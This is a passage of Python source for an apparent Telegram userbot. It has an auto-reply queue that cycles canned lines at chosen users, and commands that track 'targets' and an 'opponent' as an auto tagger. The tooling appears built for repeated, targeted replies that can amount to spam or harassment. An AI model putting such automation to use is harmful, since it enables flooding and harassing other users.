            asyncio.create_task(self._process_autoreply_queue(chat_id, sender_id))

    async def _process_autoreply_queue(self, chat_id, sender_id):
        target = (chat_id, sender_id)
        if target in self._processing_targets:
            return
        self._processing_targets.add(target)
        try:
            while self.reply_queues[target]:
                event = self.reply_queues[target].popleft()
                try:
                    await asyncio.sleep(random.randint(1, 3))
                    msgs = self.custom_messages.get(target) or self._default_messages()
                    if not msgs:
                        continue
                    idx = self.reply_index[target] % len(msgs)
                    line = msgs[idx]
                    self.reply_index[target] = (idx + 1) % len(msgs)
                    await event.reply(line)
                except Exception as e:
                    logger.exception(f"Auto-reply failed for {target}: {e}")
        finally:
            self._processing_targets.discard(target)

    async def edit_quote(self, event, text):
        try:
            entities = quote_entities(text)
            if entities:
                return await event.edit(text, formatting_entities=entities)
            else:
                return await event.edit(text, parse_mode='markdown')
        except Exception:
            return await event.edit(text)

    async def get_replied_message(self, event):
        try:
            return await event.get_reply_message()
        except Exception:
            return None

    async def resolve_message_link(self, link):
        link = link.strip().rstrip("/")
        try:
            match = re.search(r"(?:https?://)?t\.me/c/(\d+)/(\d+)", link, re.IGNORECASE)
            if match:
                internal_chat_id = match.group(1)
                message_id = int(match.group(2))
                telegram_chat_id = int("-100" + internal_chat_id)
                entity = await self.client.get_entity(telegram_chat_id)
                message = await self.client.get_messages(entity, ids=message_id)
                if not message:
                    return None
                if isinstance(message, list):
                    message = message[0] if message else None
                if not message:
                    return None
                return (entity, entity.id, message)
            match = re.search(r"(?:https?://)?t\.me/([A-Za-z0-9_]+)/(\d+)", link, re.IGNORECASE)
            if match:
                username = match.group(1)
                message_id = int(match.group(2))
                entity = await self.client.get_entity(username)
                message = await self.client.get_messages(entity, ids=message_id)
                if not message:
                    return None
                if isinstance(message, list):
                    message = message[0] if message else None
                if not message:
                    return None
                return (entity, entity.id, message)
            return None
        except Exception:
            return None

    # ------------------------------------------------------------------
    # TRACKER HELPERS (unchanged)
    # ------------------------------------------------------------------
    async def find_latest_target_message(self, tracker):
        entity = tracker["entity"]
        target_user_id = tracker["user_id"]
        try:
            async for message in self.client.iter_messages(entity, limit=1, from_user=target_user_id):
                if not message:
                    continue
                sender_id = get_message_sender_id(message)
                if sender_id != target_user_id:
                    continue
                return message
        except Exception:
            return None
        return None

    async def move_tracker_to_latest(self, tracker):
        latest = await self.find_latest_target_message(tracker)
        if not latest:
            return
        current_id = tracker["message_id"]
        if latest.id == current_id or latest.id < current_id:
            return
        tracker["message_id"] = latest.id

    async def register_our_at_message(self, message):
        if not message or not self.trackers:
            return
        message_id = getattr(message, "id", None)
        chat_id = getattr(message, "chat_id", None)
        if not message_id or chat_id is None:
            return
        for tracker in self.trackers:
            if chat_matches_tracker(chat_id, tracker["chat_id"]):
                async with self.opponent_at_lock:
                    self.opponent_at_tracker[int(message_id)] = {
                        "chat_id": int(chat_id),
                        "opponent_id": None,
                        "count": 0
                    }
                break

    async def handle_opponent_at_reply(self, event):
        if not self.ANTISPAM_ENABLED or not self.trackers:
            return
        message = event.message
        if not message:
            return
        for tracker in self.trackers:
            if not chat_matches_tracker(event.chat_id, tracker["chat_id"]):
                continue
            sender_id = get_message_sender_id(message)
            if not sender_id:
                continue
            me = await self.client.get_me()
            if sender_id == me.id:
                continue
            incoming_message_id = getattr(message, "id", None)
            if not incoming_message_id:
                continue
            replied_message = await self.get_replied_message(event)
            if not replied_message:
                continue
            replied_message_id = getattr(replied_message, "id", None)
            if not replied_message_id:
                continue
            async with self.opponent_at_lock:
                if incoming_message_id in self.processed_opponent_messages:
                    return
                info = self.opponent_at_tracker.get(int(replied_message_id))
                if not info:
                    return
                if not chat_matches_tracker(info["chat_id"], tracker["chat_id"]):
                    return
                if info["opponent_id"] is None:
                    info["opponent_id"] = int(sender_id)
                if int(sender_id) != int(info["opponent_id"]):
                    return
                self.processed_opponent_messages.add(incoming_message_id)
                if len(self.processed_opponent_messages) > 5000:
                    self.processed_opponent_messages.clear()
                info["count"] += 1
                count = info["count"]
                if count < self.ANTISPAM_THRESHOLD:
                    return
                our_message_id = int(replied_message_id)
                try:
                    await self.client.delete_messages(event.chat_id, [our_message_id])
                except Exception:
                    pass
                finally:
                    self.opponent_at_tracker.pop(our_message_id, None)
            break

    # ------------------------------------------------------------------
    # DELETION RECOVERY (for .at) - unchanged
    # ------------------------------------------------------------------
    async def find_latest_remaining_target_message(self, tracker, deleted_message_id):
        entity = tracker["entity"]
        target_user_id = tracker["user_id"]
        try:
            messages = await self.client.get_messages(
                entity,
                limit=50,
                offset_id=deleted_message_id,
                reverse=False,
                from_user=target_user_id
            )
            if not messages:
                return None
            for msg in messages:
                if msg.id == deleted_message_id:
                    continue
                if get_message_sender_id(msg) != target_user_id:
                    continue
                return msg
            return None
        except Exception:
            return None

    async def switch_target_after_delete(self, tracker, deleted_message_id):
        for attempt in range(1, 8):
            await asyncio.sleep(0.35 if attempt == 1 else 0.6)
            async with self.tracker_lock:
                if tracker not in self.trackers:
                    return
                if tracker["message_id"] != deleted_message_id:
                    return
            latest = await self.find_latest_remaining_target_message(tracker, deleted_message_id)
            if not latest:
                continue
            async with self.tracker_lock:
                if tracker not in self.trackers:
                    return
                if tracker["message_id"] != deleted_message_id:
                    return
                tracker["message_id"] = latest.id
                return

    # ------------------------------------------------------------------
    # ONEWORD TARGET UPDATE (fixed with better error handling)
    # ------------------------------------------------------------------
    async def _update_oneword_target_to_latest(self):
        if not self.oneword_active:
            return
        if self._oneword_update_attempts >= 5:  # increased attempts
            logger.warning(f"OneWord update attempts exceeded for user {self.user_id}, stopping.")
            await self._stop_oneword_internal()
            return
        self._oneword_update_attempts += 1
        try:
            entity = await self.client.get_entity(self.oneword_chat_id)
            async for msg in self.client.iter_messages(entity, from_user=self.oneword_target_user_id, limit=1):
                if msg:
                    self.oneword_target_msg_id = msg.id
                    logger.info(f"OneWord updated target to message {msg.id} for user {self.user_id}")
                    self._oneword_update_attempts = 0
                    return
            logger.info(f"No remaining messages from target user, stopping OneWord for user {self.user_id}")
            await self._stop_oneword_internal()
        except Exception as e:
            logger.error(f"Failed to update OneWord target: {e}")
            await self._stop_oneword_internal()

    # ------------------------------------------------------------------
    # .AT (unchanged)
    # ------------------------------------------------------------------
    async def at_command(self, event):
        try:
            argument = event.pattern_match.group(1)
            if argument:
                result = await self.resolve_message_link(argument)
                if not result:
                    await event.delete()
                    await self.client.send_message("me",
                        "╭─❖ ɪɴᴠᴀʟɪᴅ ᴍᴇssᴀɢᴇ ʟɪɴᴋ\n"
                        "╰─➤ ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ʟɪɴᴋ ɪs ᴠᴀʟɪᴅ ᴀɴᴅ ᴀᴄᴄᴇssɪʙʟᴇ.",
                        formatting_entities=quote_entities(
                            "╭─❖ ɪɴᴠᴀʟɪᴅ ᴍᴇssᴀɢᴇ ʟɪɴᴋ\n╰─➤ ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ʟɪɴᴋ ɪs ᴠᴀʟɪᴅ ᴀɴᴅ ᴀᴄᴄᴇssɪʙʟᴇ."
                        )
                    )
                    return
                entity, chat_id, message = result
            else:
                if not event.is_reply:
                    await event.delete()
                    await self.client.send_message("me",
                        "╭─❖ ɴᴏ ᴛᴀʀɢᴇᴛ sᴇʟᴇᴄᴛᴇᴅ\n"
                        "╰─➤ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴀʀɢᴇᴛ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴜsᴇ .ᴀᴛ.",
                        formatting_entities=quote_entities(
                            "╭─❖ ɴᴏ ᴛᴀʀɢᴇᴛ sᴇʟᴇᴄᴛᴇᴅ\n╰─➤ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴀʀɢᴇᴛ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴜsᴇ .ᴀᴛ."
                        )
                    )
                    return
                message = await self.get_replied_message(event)
                if not message:
                    await event.delete()
                    await self.client.send_message("me",
                        "╭─❖ ᴛᴀʀɢᴇᴛ ᴄᴏᴜʟᴅ ɴᴏᴛ ʙᴇ ʀᴇᴀᴅ\n"
                        "╰─➤ ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴀɢᴀɪɴ.",
                        formatting_entities=quote_entities(
                            "╭─❖ ᴛᴀʀɢᴇᴛ ᴄᴏᴜʟᴅ ɴᴏᴛ ʙᴇ ʀᴇᴀᴅ\n╰─➤ ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴀɢᴀɪɴ."
                        )
                    )
                    return
                entity = await event.get_input_chat()
                if entity is None:
                    entity = await self.client.get_entity(event.chat_id)
                chat_id = entity.id
            user_id = get_message_sender_id(message)
            if not user_id:
                await event.delete()
                await self.client.send_message("me",
                    "╭─❖ ᴜɴᴀʙʟᴇ ᴛᴏ ʀᴇᴀᴅ ᴛᴀʀɢᴇᴛ\n"
                    "╰─➤ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴜsᴇʀ ᴄᴏᴜʟᴅ ɴᴏᴛ ʙᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ.",
                    formatting_entities=quote_entities(
                        "╭─❖ ᴜɴᴀʙʟᴇ ᴛᴏ ʀᴇᴀᴅ ᴛᴀʀɢᴇᴛ\n╰─➤ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴜsᴇʀ ᴄᴏᴜʟᴅ ɴᴏᴛ ʙᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ."
                    )
                )
                return
            async with self.opponent_at_lock:
                self.opponent_at_tracker.clear()
                self.processed_opponent_messages.clear()
            new_tracker = {
                "entity": entity,
                "chat_id": entity.id,
                "message_id": message.id,
                "user_id": user_id
            }
            async with self.tracker_lock:
                self.trackers = [new_tracker]
            await self.move_tracker_to_latest(new_tracker)
            emoji_status = self.set_emoji_text if self.set_emoji_text else "ᴏꜰꜰ"
            emoji_line = f"✦ sᴇᴛᴇᴍᴏᴊɪ : {emoji_status}" if self.set_emoji_text else "✦ sᴇᴛᴇᴍᴏᴊɪ : ᴏꜰꜰ"
            name_status = self.custom_name if self.custom_name else "ᴏꜰꜰ"
            name_line = f"✦ ᴘʀᴇғɪx : {name_status}" if self.custom_name else "✦ ᴘʀᴇғɪx : ᴏꜰꜰ"
            status_text = (
                "╭─❖ ᴛᴀʀɢᴇᴛ ᴛʀᴀᴄᴋɪɴɢ ᴇɴᴀʙʟᴇᴅ\n"
                "│\n"
                f"├─➤ ᴄʜᴀᴛ : {new_tracker['chat_id']}\n"
                f"├─➤ ᴍᴇssᴀɢᴇ : {new_tracker['message_id']}\n"
                f"├─➤ ᴜsᴇʀ : {new_tracker['user_id']}\n"
                "│\n"
                f"├─➤ 🛡 ᴀɴᴛɪsᴘᴀᴍ : {'ᴏɴ' if self.ANTISPAM_ENABLED else 'ᴏꜰꜰ'}\n"
                f"├─➤ 🔢 ʀᴇᴘʟʏ ᴄᴏᴜɴᴛ : {self.ANTISPAM_THRESHOLD}\n"
                f"├─➤ {emoji_line}\n"
                f"├─➤ {name_line}\n"
                "│\n"
                "╰─➤ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴡɪʟʟ ғᴏʟʟᴏᴡ ᴛʜᴇɪʀ ʟᴀᴛᴇsᴛ ᴍᴇssᴀɢᴇ."
            )
            await event.delete()
            await self.client.send_message("me", status_text, formatting_entities=quote_entities(status_text))
        except Exception as e:
            logger.error(f".at command error for user {self.user_id}: {e}", exc_info=True)
            await event.delete()
            await self.client.send_message("me",
                "╭─❖ .ᴀᴛ ᴇʀʀᴏʀ\n╰─➤ ᴛʀʏ ᴀɢᴀɪɴ.",
                formatting_entities=quote_entities("╭─❖ .ᴀᴛ ᴇʀʀᴏʀ\n╰─➤ ᴛʀʏ ᴀɢᴀɪɴ.")
            )

    # ------------------------------------------------------------------
    # .MULTIAT (unchanged)
    # ------------------------------------------------------------------
    async def _multiat_cmd(self, event):
        arg = event.pattern_match.group(1) if event.pattern_match else ""
        if not arg:
            await event.delete()
            await self.client.send_message("me",
                "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ .ᴍᴜʟᴛɪᴀᴛ <ʟɪɴᴋ1>, <ʟɪɴᴋ2>, ...\n"
                "│\n"
                "╰─➤ ᴇxᴀᴍᴘʟᴇ: .ᴍᴜʟᴛɪᴀᴛ https://t.me/c/123/100, https://t.me/c/123/200",
                formatting_entities=quote_entities(
                    "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n│\n├─➤ .ᴍᴜʟᴛɪᴀᴛ <ʟɪɴᴋ1>, <ʟɪɴᴋ2>, ...\n│\n╰─➤ ᴇxᴀᴍᴘʟᴇ: .ᴍᴜʟᴛɪᴀᴛ https://t.me/c/123/100, https://t.me/c/123/200"
                )
            )
            return
        links = [l.strip() for l in arg.split(",") if l.strip()]
        if not links:
            await event.delete()
            await self.client.send_message("me", "❌ No valid links provided.")
            return
        new_trackers = []
        errors = []
        for link in links:
            result = await self.resolve_message_link(link)
            if not result:
                errors.append(f"Failed to resolve: {link}")
                continue
            entity, chat_id, message = result
            user_id = get_message_sender_id(message)
            if not user_id:
                errors.append(f"Could not determine sender for: {link}")
                continue
            new_trackers.append({
                "entity": entity,
                "chat_id": entity.id,
                "message_id": message.id,
                "user_id": user_id
            })
        if not new_trackers:
            await event.delete()
            await self.client.send_message("me", "❌ No valid targets could be resolved.")
            return
        async with self.tracker_lock:
            self.trackers = new_trackers
        for t in self.trackers:
            await self.move_tracker_to_latest(t)
        async with self.tracker_lock:
            count = len(self.trackers)
            summary = "\n".join(f"├─➤ ᴛᴀʀɢᴇᴛ {i+1}: ᴜsᴇʀ {t['user_id']} – ᴍsɢ {t['message_id']}" for i, t in enumerate(self.trackers))
        await event.delete()
        await self.client.send_message("me",
            f"╭─❖ ᴍᴜʟᴛɪᴀᴛ ᴇɴᴀʙʟᴇᴅ\n"
            f"│\n"
            f"├─➤ ᴛᴀʀɢᴇᴛs : {count}\n"
            f"{summary}\n"
            "│\n"
            "╰─➤ ᴀʟʟ ᴛᴀʀɢᴇᴛs ᴛʀᴀᴄᴋᴇᴅ.",
            formatting_entities=quote_entities(
                f"╭─❖ ᴍᴜʟᴛɪᴀᴛ ᴇɴᴀʙʟᴇᴅ\n│\n├─➤ ᴛᴀʀɢᴇᴛs : {count}\n{summary}\n│\n╰─➤ ᴀʟʟ ᴛᴀʀɢᴇᴛs ᴛʀᴀᴄᴋᴇᴅ."
            )
        )

    # ------------------------------------------------------------------
    # .SETNAME (unchanged)
    # ------------------------------------------------------------------
    async def _setname_cmd(self, event):
        arg = event.pattern_match.group(1) if event.pattern_match else ""
        if not arg:
            await event.delete()
            await self.client.send_message("me",
                f"╭─❖ ᴄᴜʀʀᴇɴᴛ ɴᴀᴍᴇ ᴘʀᴇғɪx\n"
                "│\n"
                f"├─➤ ɴᴀᴍᴇ : {self.custom_name if self.custom_name else 'ᴏꜰꜰ'}\n"
                "│\n"
                "╰─➤ ᴜsᴇ .sᴇᴛɴᴀᴍᴇ <ɴᴀᴍᴇ> ᴛᴏ sᴇᴛ, ᴏʀ .sᴇᴛɴᴀᴍᴇ ᴏꜰꜰ ᴛᴏ ᴅɪsᴀʙʟᴇ.",
                formatting_entities=quote_entities(
                    f"╭─❖ ᴄᴜʀʀᴇɴᴛ ɴᴀᴍᴇ ᴘʀᴇғɪx\n│\n├─➤ ɴᴀᴍᴇ : {self.custom_name if self.custom_name else 'ᴏꜰꜰ'}\n│\n╰─➤ ᴜsᴇ .sᴇᴛɴᴀᴍᴇ <ɴᴀᴍᴇ> ᴛᴏ sᴇᴛ, ᴏʀ .sᴇᴛɴᴀᴍᴇ ᴏꜰꜰ ᴛᴏ ᴅɪsᴀʙʟᴇ."
                )
            )
            return
        arg = arg.strip()
        if arg.lower() == "off":
            self.custom_name = None
            await event.delete()
            await self.client.send_message("me",
                "╭─❖ ɴᴀᴍᴇ ᴘʀᴇғɪx ᴅɪsᴀʙʟᴇᴅ\n"
                "│\n"
                "╰─➤ ɴᴏ ᴘʀᴇғɪx ᴡɪʟʟ ʙᴇ ᴀᴅᴅᴇᴅ.",
                formatting_entities=quote_entities("╭─❖ ɴᴀᴍᴇ ᴘʀᴇғɪx ᴅɪsᴀʙʟᴇᴅ\n│\n╰─➤ ɴᴏ ᴘʀᴇғɪx ᴡɪʟʟ ʙᴇ ᴀᴅᴅᴇᴅ.")
            )
            return
        if not self.trackers:
            await event.delete()
            await self.client.send_message("me",
                "╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛ.\n"
                "│\n"
                "╰─➤ ᴜsᴇ .ᴀᴛ ᴏʀ .ᴍᴜʟᴛɪᴀᴛ ғɪʀsᴛ.",
                formatting_entities=quote_entities("╭─❖ ᴇʀʀᴏʀ\n│\n├─➤ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛ.\n│\n╰─➤ ᴜsᴇ .ᴀᴛ ᴏʀ .ᴍᴜʟᴛɪᴀᴛ ғɪʀsᴛ.")
            )
            return
        self.custom_name = arg
        await event.delete()
        await self.client.send_message("me",
            f"╭─❖ ɴᴀᴍᴇ ᴘʀᴇғɪx sᴇᴛ\n"
            "│\n"
            f"├─➤ ɴᴀᴍᴇ : {arg}\n"
            "│\n"
            "╰─➤ ᴀʟʟ ᴍᴇssᴀɢᴇs ᴡɪʟʟ ʙᴇ ᴘʀᴇғɪxᴇᴅ ᴡɪᴛʜ '{arg}'.",
            formatting_entities=quote_entities(
                f"╭─❖ ɴᴀᴍᴇ ᴘʀᴇғɪx sᴇᴛ\n│\n├─➤ ɴᴀᴍᴇ : {arg}\n│\n╰─➤ ᴀʟʟ ᴍᴇssᴀɢᴇs ᴡɪʟʟ ʙᴇ ᴘʀᴇғɪxᴇᴅ ᴡɪᴛʜ '{arg}'."
            )
        )

    # ------------------------------------------------------------------
    # .STOPAT (unchanged)
    # ------------------------------------------------------------------
    async def stop_at_command(self, event):
        async with self.tracker_lock:
            if not self.trackers:
                await event.delete()
                await self.client.send_message("me",
                    "╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛ\n"
                    "╰─➤ ᴜsᴇ .ᴀᴛ ᴛᴏ sᴛᴀʀᴛ ᴛʀᴀᴄᴋɪɴɢ.",
                    formatting_entities=quote_entities("╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛ\n╰─➤ ᴜsᴇ .ᴀᴛ ᴛᴏ sᴛᴀʀᴛ ᴛʀᴀᴄᴋɪɴɢ.")
                )
                return
            self.trackers = []
            self.custom_name = None
        async with self.opponent_at_lock:
            self.opponent_at_tracker.clear()
            self.processed_opponent_messages.clear()
        await event.delete()
        await self.client.send_message("me",
            "╭─❖ ᴛᴀʀɢᴇᴛ ᴛʀᴀᴄᴋɪɴɢ sᴛᴏᴘᴘᴇᴅ\n"
            "╰─➤ ᴀʟʟ ᴛʀᴀᴄᴋɪɴɢ ᴅᴀᴛᴀ ʜᴀs ʙᴇᴇɴ ᴄʟᴇᴀʀᴇᴅ.",
            formatting_entities=quote_entities("╭─❖ ᴛᴀʀɢᴇᴛ ᴛʀᴀᴄᴋɪɴɢ sᴛᴏᴘᴘᴇᴅ\n╰─➤ ᴀʟʟ ᴛʀᴀᴄᴋɪɴɢ ᴅᴀᴛᴀ ʜᴀs ʙᴇᴇɴ ᴄʟᴇᴀʀᴇᴅ.")
        )

    # ------------------------------------------------------------------
    # .ATSTATUS (unchanged)
    # ------------------------------------------------------------------
    async def at_status_command(self, event):
        async with self.tracker_lock:
            if not self.trackers:
                await event.delete()
                await self.client.send_message("me",
                    "╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛ\n"
                    "╰─➤ ᴜsᴇ .ᴀᴛ ᴛᴏ sᴛᴀʀᴛ ᴛʀᴀᴄᴋɪɴɢ.",
                    formatting_entities=quote_entities("╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀʀɢᴇᴛ\n╰─➤ ᴜsᴇ .ᴀᴛ ᴛᴏ sᴛᴀʀᴛ ᴛʀᴀᴄᴋɪɴɢ.")
                )
                return
            tracked_count = len(self.opponent_at_tracker)
            lines = []
            for i, t in enumerate(self.trackers, 1):
                lines.append(
                    f"├─➤ ᴛᴀʀɢᴇᴛ {i}:\n"
                    f"│   ᴄʜᴀᴛ : {t['chat_id']}\n"
                    f"│   ᴍsɢ : {t['message_id']}\n"
                    f"│   ᴜsᴇʀ : {t['user_id']}"
                )
            targets_text = "\n".join(lines)
            emoji_line = f"✦ sᴇᴛᴇᴍᴏᴊɪ : {self.set_emoji_text}" if self.set_emoji_text else "✦ sᴇᴛᴇᴍᴏᴊɪ : ᴏꜰꜰ"
            name_line = f"✦ ᴘʀᴇғɪx : {self.custom_name}" if self.custom_name else "✦ ᴘʀᴇғɪx : ᴏꜰꜰ"
            status_text = (
                "╭─❖ ᴛᴀʀɢᴇᴛ sʏsᴛᴇᴍ sᴛᴀᴛᴜs\n"
                "│\n"
                f"{targets_text}\n"
                "│\n"
                f"├─➤ 🛡 ᴀɴᴛɪsᴘᴀᴍ : {'ᴏɴ' if self.ANTISPAM_ENABLED else 'ᴏꜰꜰ'}\n"
                f"├─➤ 🔢 ʀᴇᴘʟʏ ᴄᴏᴜɴᴛ : {self.ANTISPAM_THRESHOLD}\n"
                f"├─➤ {emoji_line}\n"
                f"├─➤ {name_line}\n"
                f"├─➤ ᴡᴀᴛᴄʜᴇᴅ ᴍᴇssᴀɢᴇs : {tracked_count}\n"
                "│\n"
                "╰─➤ ᴀᴜᴛᴏ ᴛᴀɢɢᴇʀ ɪs ᴀʟɪᴠᴇ."
            )
            await event.delete()
            await self.client.send_message("me", status_text, formatting_entities=quote_entities(status_text))

    # ------------------------------------------------------------------
    # ANTISPAM, SETEMOJI, SETFONT, PING, HELP (unchanged)
    # ------------------------------------------------------------------
    async def antispam_command(self, event):
        argument = event.pattern_match.group(1)
        if not argument:
            await event.delete()
            status_text = (
                f"╭─❖ ᴀɴᴛɪsᴘᴀᴍ sᴇᴛᴛɪɴɢs\n"
                "│\n"
                f"├─➤ sᴛᴀᴛᴜs : {'ᴏɴ' if self.ANTISPAM_ENABLED else 'ᴏꜰꜰ'}\n"
                f"├─➤ ʀᴇᴘʟʏ ᴄᴏᴜɴᴛ : {self.ANTISPAM_THRESHOLD}\n"
                "│\n"
                "├─➤ .ᴀɴᴛɪsᴘᴀᴍ ᴏɴ\n"
                "├─➤ .ᴀɴᴛɪsᴘᴀᴍ ᴏғғ\n"
                "╰─➤ .ᴀɴᴛɪsᴘᴀᴍ <ɴᴜᴍʙᴇʀ>"
            )
            await self.client.send_message("me", status_text, formatting_entities=quote_entities(status_text))
            return
        argument = argument.strip().lower()
        if argument in ("on", "ᴏɴ"):
            self.ANTISPAM_ENABLED = True
            await event.delete()
            confirm = (
                "╭─❖ ᴀɴᴛɪsᴘᴀᴍ ᴇɴᴀʙʟᴇᴅ\n"
                "│\n"
                f"├─➤ ʀᴇᴘʟʏ ᴄᴏᴜɴᴛ : {self.ANTISPAM_THRESHOLD}\n"
                "╰─➤ ᴛʜᴇ ᴛʀᴀᴄᴋᴇᴅ ᴍᴇssᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴅᴇʟᴇᴛᴇᴅ ᴡʜᴇɴ ᴛʜᴇ ᴛʜʀᴇsʜᴏʟᴅ ɪs ʀᴇᴀᴄʜᴇᴅ."
            )
            await self.client.send_message("me", confirm, formatting_entities=quote_entities(confirm))
            return
        if argument in ("off", "ᴏғғ"):
            self.ANTISPAM_ENABLED = False
            await event.delete()
            confirm = (
                "╭─❖ ᴀɴᴛɪsᴘᴀᴍ ᴅɪsᴀʙʟᴇᴅ\n"
                "╰─➤ ʀᴇᴘʟʏ ᴅᴇᴛᴇᴄᴛɪᴏɴ ɪs ɴᴏᴡ ᴏғғ."
            )
            await self.client.send_message("me", confirm, formatting_entities=quote_entities(confirm))
            return
        try:
            count = int(argument)
        except ValueError:
            await event.delete()
            await self.client.send_message("me", "╭─❖ ɪɴᴠᴀʟɪᴅ ᴄᴏᴜɴᴛ\n╰─➤ ᴜsᴇ .ᴀɴᴛɪsᴘᴀᴍ <ɴᴜᴍʙᴇʀ>.")
            return
        if count < 1:
            await event.delete()
            await self.client.send_message("me", "╭─❖ ɪɴᴠᴀʟɪᴅ ᴄᴏᴜɴᴛ\n╰─➤ ᴛʜᴇ ʀᴇᴘʟʏ ᴄᴏᴜɴᴛ ᴍᴜsᴛ ʙᴇ 1 ᴏʀ ʜɪɢʜᴇʀ.")
            return
        if count > 1000:
            await event.delete()
            await self.client.send_message("me", "╭─❖ ᴄᴏᴜɴᴛ ᴛᴏᴏ ʜɪɢʜ\n╰─➤ ᴘʟᴇᴀsᴇ ᴜsᴇ ᴀ ᴠᴀʟᴜᴇ ʙᴇᴛᴡᴇᴇɴ 1 ᴀɴᴅ 1000.")
            return
        self.ANTISPAM_THRESHOLD = count
        await event.delete()
        confirm = (
            "╭─❖ ᴀɴᴛɪsᴘᴀᴍ ᴄᴏᴜɴᴛ ᴜᴘᴅᴀᴛᴇᴅ\n"
            "│\n"
            f"├─➤ ʀᴇᴘʟʏ ᴄᴏᴜɴᴛ : {self.ANTISPAM_THRESHOLD}\n"
            f"├─➤ sᴛᴀᴛᴜs : {'ᴏɴ' if self.ANTISPAM_ENABLED else 'ᴏꜰꜰ'}\n"
            "│\n"
            "╰─➤ ᴜsᴇ .ᴀɴᴛɪsᴘᴀᴍ ᴏɴ ᴛᴏ ᴇɴᴀʙʟᴇ ɪᴛ."
        )
        await self.client.send_message("me", confirm, formatting_entities=quote_entities(confirm))

    async def setemoji_command(self, event):
        argument = event.pattern_match.group(1)
        if not argument:
            await event.delete()
            if self.set_emoji_text:
                entity_status = "ᴄᴜsᴛᴏᴍ / ᴘʀᴇᴍɪᴜᴍ" if self.set_emoji_document_id else "ɴᴏʀᴍᴀʟ"
                status_text = (
                    "╭─❖ sᴇᴛᴇᴍᴏᴊɪ sᴛᴀᴛᴜs\n"
                    "│\n"
                    f"├─➤ ᴇᴍᴏᴊɪ : {self.set_emoji_text}\n"
                    f"├─➤ ᴛʏᴘᴇ : {entity_status}\n"
                    "│\n"
                    "╰─➤ ᴜsᴇ .sᴇᴛᴇᴍᴏᴊɪ ᴏғғ ᴛᴏ ᴅɪsᴀʙʟᴇ."
                )
            else:
                status_text = (
                    "╭─❖ sᴇᴛᴇᴍᴏᴊɪ ɪs ᴏғғ\n"
                    "╰─➤ ᴜsᴇ .sᴇᴛᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ> ᴛᴏ sᴇᴛ ᴏɴᴇ."
                )
            await self.client.send_message("me", status_text, formatting_entities=quote_entities(status_text))
            return
        if argument.strip().lower() in ("off", "ᴏғғ"):
            self.set_emoji_text = None
            self.set_emoji_document_id = None
            await event.delete()
            confirm = (
                "╭─❖ sᴇᴛᴇᴍᴏᴊɪ ᴅɪsᴀʙʟᴇᴅ\n"
                "╰─➤ ɴᴏ ᴇᴍᴏᴊɪ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇɴᴅᴇᴅ."
            )
            await self.client.send_message("me", confirm, formatting_entities=quote_entities(confirm))
            return
        self.set_emoji_text = None
        self.set_emoji_document_id = None
        custom_entities = []
        try:
            custom_entities = event.message.get_entities_text(MessageEntityCustomEmoji)
        except Exception:
            pass
        if custom_entities:
            entity, entity_text = custom_entities[0]
            self.set_emoji_text = entity_text or argument.strip()
            self.set_emoji_document_id = int(entity.document_id)
            await event.delete()
            confirm = (
                "╭─❖ sᴇᴛᴇᴍᴏᴊɪ ᴜᴘᴅᴀᴛᴇᴅ\n"
                "│\n"
                f"├─➤ ᴇᴍᴏᴊɪ : {self.set_emoji_text}\n"
                "├─➤ ᴛʏᴘᴇ : ᴄᴜsᴛᴏᴍ / ᴘʀᴇᴍɪᴜᴍ\n"
                "├─➤ ᴇɴᴛɪᴛʏ : ᴘʀᴇsᴇʀᴠᴇᴅ\n"
                "│\n"
                "╰─➤ ᴛʜɪs ᴇᴍᴏᴊɪ ᴡɪʟʟ ʙᴇ sᴇɴᴛ ᴛʜʀᴏᴜɢʜ .ᴀᴛ."
            )
        else:
            self.set_emoji_text = argument.strip()
            self.set_emoji_document_id = None
            await event.delete()
            confirm = (
                "╭─❖ sᴇᴛᴇᴍᴏᴊɪ ᴜᴘᴅᴀᴛᴇᴅ\n"
                "│\n"
                f"├─➤ ᴇᴍᴏᴊɪ : {self.set_emoji_text}\n"
                "├─➤ ᴛʏᴘᴇ : ɴᴏʀᴍᴀʟ ᴜɴɪᴄᴏᴅᴇ\n"
                "│\n"
                "╰─➤ ᴛʜɪs ᴇᴍᴏᴊɪ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇɴᴅᴇᴅ ᴛʜʀᴏᴜɢʜ .ᴀᴛ."
            )
        await self.client.send_message("me", confirm, formatting_entities=quote_entities(confirm))

    async def setfont_command(self, event):
        argument = event.pattern_match.group(1)
        if not argument:
            await event.delete()
            current = self.selected_font if self.selected_font else "ᴏꜰꜰ"
            available = ", ".join(sorted(FONTS.keys()))
            status_text = (
                f"╭─❖ ꜰᴏɴᴛ sᴇᴛᴛɪɴɢs\n"
                "│\n"
                f"├─➤ ᴄᴜʀʀᴇɴᴛ : {current}\n"
                f"├─➤ ᴀᴠᴀɪʟᴀʙʟᴇ : {available}\n"
                "│\n"
